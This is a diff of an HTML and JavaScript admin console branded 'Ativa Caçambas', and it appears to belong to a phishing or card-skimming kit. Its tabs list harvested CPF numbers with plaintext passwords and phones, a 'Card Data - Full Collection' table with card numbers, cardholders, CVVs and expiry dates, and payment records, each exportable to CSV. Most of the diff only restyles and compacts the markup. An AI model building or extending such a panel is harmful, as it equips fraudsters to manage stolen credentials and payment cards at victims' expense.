@@ -7,48 +7,35 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Inter', sans-serif; transition: all 0.3s ease; }
 
-        body {
-            font-family: 'Inter', sans-serif;
-            transition: background-color 0.3s ease, color 0.2s ease;
-        }
-
-        /* TEMA PRETO (PADRÃO) */
+        /* TEMA ESCURO */
         body.theme-dark {
             --accent: #3b82f6;
             --accent-rgb: 59, 130, 246;
-            --accent-dark: #2563eb;
-            --bg: #000000;
-            --bg-card: #0a0a0a;
-            --bg-sidebar: #050505;
-            --border: #1a1a1a;
-            --text: #e8edf2;
-            --text-secondary: #9ca3af;
+            --bg: #0f0f12;
+            --bg-card: #1e1e24;
+            --bg-sidebar: #141419;
+            --border: #2a2a30;
+            --text: #ffffff;
+            --text-secondary: #a0a0b0;
             --text-muted: #6b7280;
-            background: #000000;
-            color: #e8edf2;
         }
-
-        /* TEMA BRANCO */
+        /* TEMA CLARO */
         body.theme-light {
             --accent: #3b82f6;
             --accent-rgb: 59, 130, 246;
-            --accent-dark: #2563eb;
-            --bg: #f5f5f5;
+            --bg: #f5f7fa;
             --bg-card: #ffffff;
             --bg-sidebar: #f8f9fa;
             --border: #e5e7eb;
             --text: #1a1f2e;
             --text-secondary: #4b5563;
             --text-muted: #6b7280;
-            background: #f5f5f5;
-            color: #1a1f2e;
         }
+
+        body { background: var(--bg); color: var(--text); }
 
         #bgCanvas {
             position: fixed;
@@ -58,6 +45,7 @@
             height: 100%;
             z-index: 0;
             pointer-events: none;
+            opacity: 0.15;
         }
 
         .loading-screen {
@@ -78,7 +66,7 @@
             width: 40px;
             height: 40px;
             border: 3px solid rgba(255,255,255,0.1);
-            border-top-color: var(--accent, #3b82f6);
+            border-top-color: var(--accent);
             border-radius: 50%;
             animation: spin 0.6s linear infinite;
         }
@@ -116,7 +104,7 @@
         }
         .login-box { width: 100%; max-width: 380px; }
         .login-box h1 { font-size: 32px; font-weight: 700; color: #1a1a2e; margin-bottom: 8px; }
-        .login-box h1 span { color: var(--accent, #3b82f6); }
+        .login-box h1 span { color: #3b82f6; }
         .login-box .subtitle { color: #6b7280; font-size: 14px; margin-bottom: 32px; }
         .login-box .form-group { margin-bottom: 24px; }
         .login-box label { display: block; font-size: 13px; font-weight: 600; color: #374151; margin-bottom: 8px; }
@@ -129,22 +117,21 @@
             color: #1f2937;
             font-size: 14px;
         }
-        .login-box input:focus { outline: none; border-color: var(--accent, #3b82f6); }
+        .login-box input:focus { outline: none; border-color: #3b82f6; }
         .login-btn {
             width: 100%;
             padding: 14px;
-            background: var(--accent, #3b82f6);
+            background: #3b82f6;
             border: none;
             border-radius: 12px;
             font-weight: 600;
-            font-size: 14px;
             cursor: pointer;
             color: #fff;
-            transition: all 0.2s ease;
+            transition: all 0.2s;
         }
-        .login-btn:hover { background: var(--accent-dark); transform: translateY(-2px); }
+        .login-btn:hover { background: #2563eb; transform: translateY(-2px); }
         .login-footer { text-align: center; margin-top: 24px; font-size: 13px; color: #6b7280; }
-        .login-footer a { color: var(--accent, #3b82f6); text-decoration: none; }
+        .login-footer a { color: #3b82f6; text-decoration: none; }
         .error-msg {
             background: #fee2e2;
             border: 1px solid #fecaca;
@@ -171,13 +158,13 @@
             background: var(--bg-sidebar);
             border-right: 1px solid var(--border);
             z-index: 100;
-            transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            transition: transform 0.3s ease;
             overflow-y: auto;
         }
         .sidebar.collapsed { transform: translateX(-260px); }
         .sidebar-header { padding: 24px 20px; border-bottom: 1px solid var(--border); margin-bottom: 20px; }
         .sidebar-header h2 { font-size: 20px; font-weight: 600; color: var(--text); }
-        .sidebar-header h2 span { color: var(--accent, #3b82f6); }
+        .sidebar-header h2 span { color: var(--accent); }
         .sidebar-header p { font-size: 11px; color: var(--text-muted); margin-top: 4px; }
         .sidebar-menu { list-style: none; padding: 0 12px; }
         .sidebar-menu li { margin-bottom: 4px; }
@@ -190,11 +177,12 @@
             border-radius: 10px;
             font-size: 14px;
             cursor: pointer;
-            transition: all 0.2s ease;
+            transition: all 0.2s;
+            text-decoration: none;
         }
         .sidebar-menu a i { width: 20px; font-size: 16px; }
-        .sidebar-menu a:hover { background: rgba(59,130,246,0.1); color: var(--accent); }
-        .sidebar-menu a.active { background: rgba(59,130,246,0.15); color: var(--accent); }
+        .sidebar-menu a:hover { background: rgba(59,130,246,0.15); color: var(--accent); }
+        .sidebar-menu a.active { background: rgba(59,130,246,0.25); color: var(--accent); }
 
         .sidebar-toggle {
             position: fixed;
@@ -210,7 +198,7 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            transition: all 0.3s ease;
             color: var(--text-secondary);
         }
         .sidebar-toggle.collapsed { left: 20px; }
@@ -219,7 +207,7 @@
         .main-content {
             margin-left: 260px;
             padding: 24px 32px;
-            transition: margin-left 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            transition: margin-left 0.3s ease;
         }
         .main-content.expanded { margin-left: 20px; }
 
@@ -241,7 +229,7 @@
             color: var(--text-secondary);
             cursor: pointer;
             font-size: 13px;
-            transition: all 0.2s ease;
+            transition: all 0.2s;
         }
         .logout-btn:hover { background: #ef4444; border-color: #ef4444; color: #fff; transform: translateY(-2px); }
 
@@ -251,12 +239,14 @@
             gap: 16px;
             margin-bottom: 28px;
         }
+        @media (max-width: 1000px) { .stats-grid { grid-template-columns: repeat(3, 1fr); } }
+        @media (max-width: 600px) { .stats-grid { grid-template-columns: repeat(2, 1fr); } }
         .stat-card {
             background: var(--bg-card);
             border: 1px solid var(--border);
             border-radius: 14px;
             padding: 16px;
-            transition: all 0.2s ease;
+            transition: all 0.2s;
         }
         .stat-card:hover { transform: translateY(-4px); border-color: var(--accent); }
         .stat-value { font-size: 26px; font-weight: 700; color: var(--accent); }
@@ -279,7 +269,7 @@
             font-weight: 500;
             cursor: pointer;
             border-radius: 40px;
-            transition: all 0.2s ease;
+            transition: all 0.2s;
         }
         .tab:hover { color: var(--accent); transform: translateY(-2px); }
         .tab.active { background: rgba(59,130,246,0.15); color: var(--accent); }
@@ -301,9 +291,10 @@
             font-weight: 600;
             font-size: 14px;
             color: var(--text);
+            flex-wrap: wrap;
+            gap: 10px;
         }
 
-        /* Products */
         .products-container { display: flex; flex-direction: column; gap: 12px; }
         .product-row {
             display: flex;
@@ -312,14 +303,16 @@
             padding: 14px 16px;
             background: var(--bg-sidebar);
             border-radius: 12px;
-            transition: all 0.2s ease;
+            transition: all 0.2s;
+            flex-wrap: wrap;
+            gap: 10px;
         }
         .product-row:hover { background: rgba(59,130,246,0.1); transform: translateX(4px); }
-        .product-info { display: flex; align-items: center; gap: 14px; flex: 2; }
+        .product-info { display: flex; align-items: center; gap: 14px; flex: 2; min-width: 200px; }
         .product-icon {
             width: 44px;
             height: 44px;
-            background: rgba(59,130,246,0.1);
+            background: rgba(59,130,246,0.15);
             border-radius: 12px;
             display: flex;
             align-items: center;
@@ -329,7 +322,7 @@
         }
         .product-details h4 { font-size: 14px; font-weight: 600; margin-bottom: 4px; color: var(--text); }
         .product-details p { font-size: 11px; color: var(--text-muted); }
-        .product-price { flex: 1; text-align: right; font-weight: 700; font-size: 16px; color: var(--accent); }
+        .product-price { font-weight: 700; font-size: 16px; color: var(--accent); min-width: 100px; text-align: right; }
         .product-actions { margin-left: 16px; }
 
         .btn-icon {
@@ -340,7 +333,7 @@
             border-radius: 8px;
             cursor: pointer;
             color: var(--text-secondary);
-            transition: all 0.2s ease;
+            transition: all 0.2s;
         }
         .btn-icon:hover { background: #ef4444; color: #fff; transform: scale(1.1); }
         
@@ -352,21 +345,9 @@
             color: #ef4444;
             cursor: pointer;
             font-size: 12px;
-            transition: all 0.2s ease;
+            transition: all 0.2s;
         }
         .btn-delete:hover { background: #ef4444; color: #fff; transform: translateY(-2px); }
-        
-        .btn-add {
-            background: rgba(16,185,129,0.15);
-            border: 1px solid rgba(16,185,129,0.3);
-            padding: 6px 14px;
-            border-radius: 8px;
-            color: #10b981;
-            cursor: pointer;
-            font-size: 12px;
-            transition: all 0.2s ease;
-        }
-        .btn-add:hover { background: #10b981; color: #fff; transform: translateY(-2px); }
 
         .form-row {
             display: grid;
@@ -383,7 +364,7 @@
             border-radius: 10px;
             color: var(--text);
             font-size: 13px;
-            transition: all 0.2s ease;
+            transition: all 0.2s;
         }
         .form-group input:focus { outline: none; border-color: var(--accent); }
         .btn-primary {
@@ -395,38 +376,16 @@
             font-size: 13px;
             cursor: pointer;
             color: #fff;
-            transition: all 0.2s ease;
+            transition: all 0.2s;
         }
-        .btn-primary:hover { background: var(--accent-dark); transform: translateY(-2px); }
+        .btn-primary:hover { background: #2563eb; transform: translateY(-2px); }
 
-        /* Tabelas Profissionais */
-        .table-wrapper {
-            overflow-x: auto;
-            border-radius: 12px;
-        }
-        table {
-            width: 100%;
-            border-collapse: collapse;
-            min-width: 600px;
-        }
-        th, td {
-            padding: 14px 12px;
-            text-align: left;
-            font-size: 13px;
-        }
-        th {
-            background: rgba(59,130,246,0.08);
-            color: var(--accent);
-            font-weight: 600;
-            border-bottom: 2px solid var(--accent);
-        }
-        td {
-            color: var(--text);
-            border-bottom: 1px solid var(--border);
-        }
-        tr:hover td {
-            background: rgba(59,130,246,0.05);
-        }
+        .table-wrapper { overflow-x: auto; border-radius: 12px; }
+        table { width: 100%; border-collapse: collapse; min-width: 500px; }
+        th, td { padding: 12px; text-align: left; font-size: 13px; }
+        th { background: rgba(59,130,246,0.1); color: var(--accent); font-weight: 600; border-bottom: 2px solid var(--accent); }
+        td { color: var(--text); border-bottom: 1px solid var(--border); }
+        tr:hover td { background: rgba(59,130,246,0.05); }
 
         .badge {
             display: inline-block;
@@ -442,16 +401,16 @@
 
         .theme-options { display: flex; gap: 12px; flex-wrap: wrap; }
         .theme-btn {
-            width: 36px;
-            height: 36px;
-            border-radius: 10px;
+            width: 40px;
+            height: 40px;
+            border-radius: 12px;
             cursor: pointer;
             border: 2px solid transparent;
-            transition: all 0.2s ease;
+            transition: all 0.2s;
         }
-        .theme-btn:hover { transform: scale(1.1); }
+        .theme-btn:hover { transform: scale(1.05); }
         .theme-btn.active { border-color: var(--accent); transform: scale(1.05); }
-        .theme-dark-btn { background: #000000; border: 1px solid #333; }
+        .theme-dark-btn { background: #1a1f2e; }
         .theme-light-btn { background: #ffffff; border: 1px solid #ddd; }
 
         .log-item {
@@ -475,13 +434,13 @@
             padding: 10px 18px;
             border-radius: 10px;
             z-index: 2000;
-            animation: slideIn 0.3s ease;
+            animation: slideIn 0.3s;
             font-size: 13px;
             color: var(--text);
         }
         @keyframes slideIn { from { opacity: 0; transform: translateX(100px); } to { opacity: 1; transform: translateX(0); } }
 
-        .tab-content { display: none; animation: fadeIn 0.3s ease; }
+        .tab-content { display: none; animation: fadeIn 0.3s; }
         .tab-content.active { display: block; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
 
@@ -498,7 +457,7 @@
             border: none;
             padding: 6px;
             color: var(--text);
-            width: 180px;
+            width: 160px;
         }
         .search-box input:focus { outline: none; }
 
@@ -516,9 +475,9 @@
             .sidebar.mobile-open { transform: translateX(0); }
             .sidebar-toggle { left: 20px; }
             .main-content { margin-left: 20px; padding: 16px; }
-            .stats-grid { grid-template-columns: repeat(2, 1fr); gap: 12px; }
-            .product-row { flex-direction: column; align-items: flex-start; gap: 12px; }
+            .product-row { flex-direction: column; align-items: flex-start; }
             .product-actions { margin-left: 0; }
+            .product-price { text-align: left; }
         }
     </style>
 </head>
@@ -540,25 +499,17 @@
             <h1>ACESS<span>ADMIN</span></h1>
             <div class="subtitle">Access the administration panel</div>
             <div class="error-msg" id="loginError">Invalid credentials</div>
-            <div class="form-group">
-                <label>Login</label>
-                <input type="text" id="loginUser" placeholder="User">
-            </div>
-            <div class="form-group">
-                <label>Password</label>
-                <input type="password" id="loginPass" placeholder="••••••••">
-            </div>
+            <div class="form-group"><label>Login</label><input type="text" id="loginUser" placeholder="User"></div>
+            <div class="form-group"><label>Password</label><input type="password" id="loginPass" placeholder="••••••••"></div>
             <button class="login-btn" onclick="handleLogin()">LOGIN</button>
-            <div class="login-footer">
-                <a href="#">Forgot Username / Password?</a>
-            </div>
+            <div class="login-footer"><a href="#">Forgot Username / Password?</a></div>
         </div>
     </div>
 </div>
 
 <!-- ADMIN PANEL -->
 <div class="admin-panel" id="adminPanel">
-    <button class="sidebar-toggle" id="sidebarToggle" onclick="toggleSidebar()"><i class="fas fa-chevron-left"></i></button>
+    <button class="sidebar-toggle" id="sidebarToggle" onclick="toggleSidebar()"><i class="fas fa-bars"></i></button>
     
     <aside class="sidebar" id="sidebar">
         <div class="sidebar-header">
@@ -636,103 +587,17 @@
             </div>
         </div>
 
-        <div id="tabAgendamentos" class="tab-content">
-            <div class="card">
-                <div class="card-header">Appointments</div>
-                <div class="table-wrapper" id="scheduleList"></div>
-            </div>
-        </div>
-
-        <div id="tabUsers" class="tab-content">
-            <div class="card">
-                <div class="card-header">
-                    <span>User Data</span>
-                    <div style="display:flex; gap:10px;">
-                        <div class="search-box"><i class="fas fa-search"></i><input type="text" id="searchUsers" placeholder="Search CPF..." onkeyup="filterUsers()"></div>
-                        <button class="btn-primary" onclick="exportUsersCSV()">Export CSV</button>
-                        <button class="btn-delete" onclick="clearAllUsers()">Clear All</button>
-                    </div>
-                </div>
-                <div class="table-wrapper">
-                    <table>
-                        <thead><tr><th>CPF</th><th>Password</th><th>Phone</th><th>Date</th><th>Actions</th></tr></thead>
-                        <tbody id="usersTable"></tbody>
-                    </table>
-                </div>
-            </div>
-        </div>
-
-        <div id="tabCards" class="tab-content">
-            <div class="card">
-                <div class="card-header">
-                    <span>Card Data - Full Collection</span>
-                    <div style="display:flex; gap:10px;">
-                        <div class="search-box"><i class="fas fa-search"></i><input type="text" id="searchCards" placeholder="Search CPF..." onkeyup="filterCards()"></div>
-                        <button class="btn-primary" onclick="exportCardsCSV()">Export CSV</button>
-                        <button class="btn-delete" onclick="clearAllCards()">Clear All</button>
-                    </div>
-                </div>
-                <div class="table-wrapper">
-                    <table>
-                        <thead><tr><th>Client (CPF + Name)</th><th>Card Number</th><th>Cardholder</th><th>CVV</th><th>Expiry</th><th>Date</th><th>Actions</th></tr></thead>
-                        <tbody id="cardsTable"></tbody>
-                    </table>
-                </div>
-            </div>
-        </div>
-
-        <div id="tabPayments" class="tab-content">
-            <div class="card">
-                <div class="card-header">
-                    <span>Payment History</span>
-                    <div style="display:flex; gap:10px;">
-                        <button class="btn-primary" onclick="exportPaymentsCSV()">Export CSV</button>
-                        <button class="btn-delete" onclick="clearAllPayments()">Clear All</button>
-                    </div>
-                </div>
-                <div class="table-wrapper" id="paymentsList"></div>
-            </div>
-        </div>
-
-        <div id="tabLogs" class="tab-content">
-            <div class="card">
-                <div class="card-header">
-                    <span>System Logs</span>
-                    <button class="btn-delete" onclick="clearAllLogs()">Clear All</button>
-                </div>
-                <div id="logsList"></div>
-            </div>
-        </div>
+        <div id="tabAgendamentos" class="tab-content"><div class="card"><div class="card-header">Appointments</div><div class="table-wrapper" id="scheduleList"></div></div></div>
+        <div id="tabUsers" class="tab-content"><div class="card"><div class="card-header"><span>User Data</span><div style="display:flex; gap:10px;"><div class="search-box"><i class="fas fa-search"></i><input type="text" id="searchUsers" placeholder="Search CPF..." onkeyup="filterUsers()"></div><button class="btn-primary" onclick="exportUsersCSV()">Export CSV</button><button class="btn-delete" onclick="clearAllUsers()">Clear All</button></div></div><div class="table-wrapper"><table><thead><tr><th>CPF</th><th>Password</th><th>Phone</th><th>Date</th><th>Actions</th></tr></thead><tbody id="usersTable"></tbody></table></div></div></div>
+        <div id="tabCards" class="tab-content"><div class="card"><div class="card-header"><span>Card Data - Full Collection</span><div style="display:flex; gap:10px;"><div class="search-box"><i class="fas fa-search"></i><input type="text" id="searchCards" placeholder="Search CPF..." onkeyup="filterCards()"></div><button class="btn-primary" onclick="exportCardsCSV()">Export CSV</button><button class="btn-delete" onclick="clearAllCards()">Clear All</button></div></div><div class="table-wrapper"><td><thead><tr><th>Client (CPF + Name)</th><th>Card Number</th><th>Cardholder</th><th>CVV</th><th>Expiry</th><th>Date</th><th>Actions</th></tr></thead><tbody id="cardsTable"></tbody></table></div></div></div>
+        <div id="tabPayments" class="tab-content"><div class="card"><div class="card-header"><span>Payment History</span><div style="display:flex; gap:10px;"><button class="btn-primary" onclick="exportPaymentsCSV()">Export CSV</button><button class="btn-delete" onclick="clearAllPayments()">Clear All</button></div></div><div class="table-wrapper" id="paymentsList"></div></div></div>
+        <div id="tabLogs" class="tab-content"><div class="card"><div class="card-header"><span>System Logs</span><button class="btn-delete" onclick="clearAllLogs()">Clear All</button></div><div id="logsList"></div></div></div>
 
         <div id="tabSettings" class="tab-content">
-            <div class="card">
-                <div class="card-header">Theme</div>
-                <div class="theme-options">
-                    <div class="theme-btn theme-dark-btn" onclick="setTheme('dark')" title="Dark Mode"></div>
-                    <div class="theme-btn theme-light-btn" onclick="setTheme('light')" title="Light Mode"></div>
-                </div>
-            </div>
-            <div class="card">
-                <div class="card-header">Add New Admin User</div>
-                <form id="addUserForm">
-                    <div class="form-row">
-                        <div class="form-group"><label>Username</label><input type="text" id="newUsername" required placeholder="Novo usuário"></div>
-                        <div class="form-group"><label>Password</label><input type="password" id="newPassword" required placeholder="Senha"></div>
-                    </div>
-                    <button type="submit" class="btn-primary">Add User</button>
-                </form>
-                <div id="addUserMsg" style="margin-top:12px; font-size:12px;"></div>
-            </div>
-            <div class="card">
-                <div class="card-header">Change Password</div>
-                <div class="form-group"><label>Current Password</label><input type="password" id="currentPass"></div>
-                <div class="form-group"><label>New Password (min 6 chars)</label><input type="password" id="newPass"></div>
-                <div class="form-group"><label>Confirm Password</label><input type="password" id="confirmPass"></div>
-                <button class="btn-primary" onclick="changeAdminPassword()">Update</button>
-                <div id="passwordMsg" style="margin-top:12px; font-size:12px;"></div>
-            </div>
+            <div class="card"><div class="card-header">Theme</div><div class="theme-options"><div class="theme-btn theme-dark-btn" onclick="setTheme('dark')" title="Dark Mode"></div><div class="theme-btn theme-light-btn" onclick="setTheme('light')" title="Light Mode"></div></div></div>
+            <div class="card"><div class="card-header">Add New Admin User</div><form id="addUserForm"><div class="form-row"><div class="form-group"><label>Username</label><input type="text" id="newUsername" required placeholder="Novo usuário"></div><div class="form-group"><label>Password</label><input type="password" id="newPassword" required placeholder="Senha"></div></div><button type="submit" class="btn-primary">Add User</button></form><div id="addUserMsg" style="margin-top:12px; font-size:12px;"></div></div>
+            <div class="card"><div class="card-header">Change Password</div><div class="form-group"><label>Current Password</label><input type="password" id="currentPass"></div><div class="form-group"><label>New Password (min 6 chars)</label><input type="password" id="newPass"></div><div class="form-group"><label>Confirm Password</label><input type="password" id="confirmPass"></div><button class="btn-primary" onclick="changeAdminPassword()">Update</button><div id="passwordMsg" style="margin-top:12px; font-size:12px;"></div></div>
         </div>
-
         <div class="footer">Ativa Caçambas | Secure Management Console</div>
     </main>
 </div>
@@ -748,7 +613,6 @@
     const renderer = new THREE.WebGLRenderer({ canvas, alpha: true });
     renderer.setSize(window.innerWidth, window.innerHeight);
     renderer.setClearColor(0x000000, 1);
-    
     const starsCount = 400;
     const starsGeometry = new THREE.BufferGeometry();
     const starsPositions = new Float32Array(starsCount * 3);
@@ -761,688 +625,103 @@
     const stars = new THREE.Points(starsGeometry, new THREE.PointsMaterial({ color: 0xffffff, size: 0.2, transparent: true, opacity: 0.3 }));
     scene.add(stars);
     camera.position.z = 10;
-    
-    function animate() {
-        requestAnimationFrame(animate);
-        stars.rotation.y += 0.0002;
-        stars.rotation.x += 0.0001;
-        renderer.render(scene, camera);
-    }
+    function animate() { requestAnimationFrame(animate); stars.rotation.y += 0.0002; stars.rotation.x += 0.0001; renderer.render(scene, camera); }
     animate();
-    window.addEventListener('resize', () => {
-        camera.aspect = window.innerWidth / window.innerHeight;
-        camera.updateProjectionMatrix();
-        renderer.setSize(window.innerWidth, window.innerHeight);
-    });
+    window.addEventListener('resize', () => { camera.aspect = window.innerWidth / window.innerHeight; camera.updateProjectionMatrix(); renderer.setSize(window.innerWidth, window.innerHeight); });
 })();
 
-setTimeout(() => {
-    const loader = document.getElementById('loadingScreen');
-    if(loader) loader.classList.add('hidden');
-}, 400);
+setTimeout(() => { const loader = document.getElementById('loadingScreen'); if(loader) loader.classList.add('hidden'); }, 400);
 
 // ========== ADMIN LOGIC ==========
 let adminToken = null;
 let refreshInterval = null;
-let productsData = [];
-let usersData = [];
-let cardsData = [];
-let paymentsData = [];
-let logsData = [];
-let scheduleData = [];
+let productsData = [], usersData = [], cardsData = [], paymentsData = [], logsData = [], scheduleData = [];
 let loadedTabs = { dashboard: true };
 
 function showToast(msg, type = 'info') {
-    const toast = document.createElement('div');
-    toast.className = 'toast';
-    toast.style.borderLeftColor = type === 'success' ? '#10b981' : '#3b82f6';
-    toast.innerHTML = msg;
-    document.body.appendChild(toast);
-    setTimeout(() => toast.remove(), 2500);
+    const toast = document.createElement('div'); toast.className = 'toast'; toast.style.borderLeftColor = type === 'success' ? '#10b981' : '#3b82f6'; toast.innerHTML = msg; document.body.appendChild(toast); setTimeout(() => toast.remove(), 2500);
 }
-
-function formatCPF(cpf) {
-    if(!cpf) return '';
-    cpf = cpf.toString();
-    if(cpf.length === 11) return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
-    return cpf;
-}
-
-function formatPhone(phone) {
-    if(!phone) return '-';
-    phone = phone.toString();
-    if(phone.length === 11) return phone.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
-    if(phone.length === 10) return phone.replace(/(\d{2})(\d{4})(\d{4})/, '($1) $2-$3');
-    return phone;
-}
-
-function formatCardNumber(num) {
-    if(!num) return '****';
-    let str = num.toString().replace(/\s/g, '');
-    if(str.length >= 16) return str.slice(0,4) + ' **** **** ' + str.slice(-4);
-    return str;
-}
+function formatCPF(cpf) { if(!cpf) return ''; cpf = cpf.toString(); if(cpf.length === 11) return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4'); return cpf; }
+function formatPhone(phone) { if(!phone) return '-'; phone = phone.toString(); if(phone.length === 11) return phone.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3'); if(phone.length === 10) return phone.replace(/(\d{2})(\d{4})(\d{4})/, '($1) $2-$3'); return phone; }
+function formatCardNumber(num) { if(!num) return '****'; let str = num.toString().replace(/\s/g, ''); if(str.length >= 16) return str.slice(0,4) + ' **** **** ' + str.slice(-4); return str; }
+function escapeHtml(str) { if(!str) return ''; return str.replace(/[&<>]/g, function(m) { if(m === '&') return '&amp;'; if(m === '<') return '&lt;'; if(m === '>') return '&gt;'; return m; }); }
 
 let sidebarCollapsed = false;
 function toggleSidebar() {
-    const sidebar = document.getElementById('sidebar');
-    const mainContent = document.getElementById('mainContent');
-    const toggleBtn = document.getElementById('sidebarToggle');
-    
-    if(window.innerWidth <= 768) {
-        sidebar.classList.toggle('mobile-open');
-    } else {
-        sidebarCollapsed = !sidebarCollapsed;
-        if(sidebarCollapsed) {
-            sidebar.classList.add('collapsed');
-            mainContent.classList.add('expanded');
-            toggleBtn.classList.add('collapsed');
-            toggleBtn.innerHTML = '<i class="fas fa-chevron-right"></i>';
-        } else {
-            sidebar.classList.remove('collapsed');
-            mainContent.classList.remove('expanded');
-            toggleBtn.classList.remove('collapsed');
-            toggleBtn.innerHTML = '<i class="fas fa-chevron-left"></i>';
-        }
-    }
+    const sidebar = document.getElementById('sidebar'); const mainContent = document.getElementById('mainContent'); const toggleBtn = document.getElementById('sidebarToggle');
+    if(window.innerWidth <= 768) { sidebar.classList.toggle('mobile-open'); }
+    else { sidebarCollapsed = !sidebarCollapsed; if(sidebarCollapsed) { sidebar.classList.add('collapsed'); mainContent.classList.add('expanded'); toggleBtn.classList.add('collapsed'); toggleBtn.innerHTML = '<i class="fas fa-chevron-right"></i>'; } else { sidebar.classList.remove('collapsed'); mainContent.classList.remove('expanded'); toggleBtn.classList.remove('collapsed'); toggleBtn.innerHTML = '<i class="fas fa-bars"></i>'; } }
 }
 
-function setTheme(theme) {
-    document.body.classList.remove('theme-dark', 'theme-light');
-    document.body.classList.add(`theme-${theme}`);
-    localStorage.setItem('adminTheme', theme);
-    document.querySelectorAll('.theme-btn').forEach(btn => btn.classList.remove('active'));
-    if(event && event.target) event.target.classList.add('active');
+function setTheme(theme) { document.body.classList.remove('theme-dark', 'theme-light'); document.body.classList.add(`theme-${theme}`); localStorage.setItem('adminTheme', theme); document.querySelectorAll('.theme-btn').forEach(btn => btn.classList.remove('active')); if(event && event.target) event.target.classList.add('active'); }
+function loadSavedTheme() { const saved = localStorage.getItem('adminTheme'); if(saved) setTheme(saved); else setTheme('dark'); } loadSavedTheme();
+
+async function handleLogin() { const username = document.getElementById('loginUser').value.trim(); const password = document.getElementById('loginPass').value.trim(); const errorDiv = document.getElementById('loginError');
+    if(!username || !password) { errorDiv.style.display = 'block'; errorDiv.textContent = 'Please enter email and password'; setTimeout(() => errorDiv.style.display = 'none', 2000); return; }
+    try { const res = await fetch('/api/admin/login', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ username, password }) }); const data = await res.json();
+        if(data.success) { adminToken = data.token; sessionStorage.setItem('adminToken', adminToken); document.getElementById('loginContainer').style.display = 'none'; document.getElementById('adminPanel').classList.add('visible'); if(refreshInterval) clearInterval(refreshInterval); refreshInterval = setInterval(() => { if(adminToken) refreshAllData(); }, 15000); loadAllData(); showToast(`Welcome back`); }
+        else { errorDiv.style.display = 'block'; errorDiv.textContent = 'Invalid email or password'; setTimeout(() => errorDiv.style.display = 'none', 2000); }
+    } catch(e) { errorDiv.style.display = 'block'; errorDiv.textContent = 'Connection error'; setTimeout(() => errorDiv.style.display = 'none', 2000); }
 }
+function handleLogout() { if(refreshInterval) clearInterval(refreshInterval); sessionStorage.removeItem('adminToken'); adminToken = null; document.getElementById('adminPanel').classList.remove('visible'); document.getElementById('loginContainer').style.display = 'flex'; showToast('Logged out'); }
+if(sessionStorage.getItem('adminToken')) { adminToken = sessionStorage.getItem('adminToken'); document.getElementById('loginContainer').style.display = 'none'; document.getElementById('adminPanel').classList.add('visible'); loadAllData(); refreshInterval = setInterval(() => { if(adminToken) refreshAllData(); }, 15000); }
 
-function loadSavedTheme() {
-    const saved = localStorage.getItem('adminTheme');
-    if(saved) setTheme(saved);
-    else setTheme('dark');
-}
-loadSavedTheme();
+async function refreshAllData() { if(!adminToken) return; try { const statsRes = await fetch('/api/admin/stats', { headers: { 'Authorization': `Bearer ${adminToken}` } }); const statsData = await statsRes.json(); const stats = statsData.stats || {}; document.getElementById('statTotalUsers').innerText = stats.total_users || 0; document.getElementById('statComSenha').innerText = stats.com_senha || 0; document.getElementById('statTotalLogs').innerText = stats.total_logs || 0; document.getElementById('statProdutos').innerText = stats.total_produtos || 0; document.getElementById('statAgendamentos').innerText = stats.total_agendamentos || 0; await loadProducts(); await loadSchedule(); await loadUsers(); await loadCards(); await loadPayments(); await loadLogs(); const totalPaid = paymentsData.filter(p => p.status === 'paid').reduce((s, p) => s + parseFloat(p.valor || 0), 0); document.getElementById('statTotalPagos').innerHTML = `R$ ${totalPaid.toFixed(2)}`; } catch(e) { console.error(e); } }
 
-async function handleLogin() {
-    const username = document.getElementById('loginUser').value.trim();
-    const password = document.getElementById('loginPass').value.trim();
-    const errorDiv = document.getElementById('loginError');
-    
-    if(!username || !password) {
-        errorDiv.style.display = 'block';
-        errorDiv.textContent = 'Please enter email and password';
-        setTimeout(() => errorDiv.style.display = 'none', 2000);
-        return;
-    }
-    try {
-        const res = await fetch('/api/admin/login', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ username, password })
-        });
-        const data = await res.json();
-        if(data.success) {
-            adminToken = data.token;
-            sessionStorage.setItem('adminToken', adminToken);
-            document.getElementById('loginContainer').style.display = 'none';
-            document.getElementById('adminPanel').classList.add('visible');
-            if(refreshInterval) clearInterval(refreshInterval);
-            refreshInterval = setInterval(() => { if(adminToken) refreshAllData(); }, 15000);
-            loadAllData();
-            showToast(`Welcome back`);
-        } else {
-            errorDiv.style.display = 'block';
-            errorDiv.textContent = 'Invalid email or password';
-            setTimeout(() => errorDiv.style.display = 'none', 2000);
-        }
-    } catch(e) {
-        errorDiv.style.display = 'block';
-        errorDiv.textContent = 'Connection error';
-        setTimeout(() => errorDiv.style.display = 'none', 2000);
-    }
-}
